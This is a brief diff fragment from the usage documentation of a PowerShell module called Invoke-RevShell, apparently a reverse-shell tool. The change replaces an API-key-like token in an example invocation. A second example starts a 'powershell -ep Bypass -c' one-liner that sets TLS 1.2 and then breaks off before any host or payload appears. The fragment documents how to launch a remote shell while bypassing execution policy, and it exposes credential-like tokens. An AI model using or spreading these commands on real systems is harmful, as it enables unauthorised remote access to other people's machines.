@@ -13,7 +13,7 @@ function Invoke-RevShell {
 
     .EXAMPLE
     C:\PS> Import-Module .\Invoke-RevShell
-    C:\PS> Invoke-RevShell -api 29LcIAegJTJMHyzuw3ttSrM6GaD_3CKa5au8JfztMKoaqAF7L
+    C:\PS> Invoke-RevShell -api 29yl5EiFZzgT0Atb31Gi15TERuT_6SRPezQnv1kT2WLo5b1Mr
     
     .EXAMPLE
     powershell -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
